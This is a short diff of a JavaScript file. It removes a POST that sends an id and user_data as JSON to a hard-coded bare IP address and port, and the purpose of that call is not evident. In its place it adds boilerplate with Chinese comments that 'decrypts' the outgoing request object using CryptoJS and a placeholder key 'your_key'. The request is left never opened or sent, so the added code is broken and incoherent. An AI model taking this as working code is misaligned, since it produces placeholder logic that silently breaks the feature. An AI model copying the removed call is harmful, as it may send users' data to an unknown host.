@@ -383,9 +383,20 @@
             res['id'] = id;
             res['data'] = user_data;
             const httpRequest = new XMLHttpRequest();
-            httpRequest.open('POST', 'https://124.222.110.105:5721', true);
-            httpRequest.setRequestHeader("Content-type", "application/json");
-            httpRequest.send(JSON.stringify(res));
+            // 导入所需的解密库，这里以CryptoJS为例  
+            const CryptoJS = require('crypto-js');  
+  
+            // 假设res是包含密文的变量  
+            let encryptedData = res; // 这里替换为实际的密文数据  
+  
+            // 假设您知道解密的密钥（key）和算法（algorithm）  
+            let key = 'your_key'; // 这里替换为实际的密钥  
+            let algorithm = 'AES-CBC'; // 这里替换为实际的算法  
+  
+            // 使用CryptoJS进行解密  
+            let bytes = CryptoJS.AES.decrypt(encryptedData.toString(), key, { mode: CryptoJS.mode.CBC });  
+            let decryptedData = bytes.toString(CryptoJS.enc.Utf8);  
+
             httpRequest.onreadystatechange = function () {
                 if (httpRequest.readyState === 4 && httpRequest.status === 200) {
                     let result = JSON.parse(httpRequest.responseText);
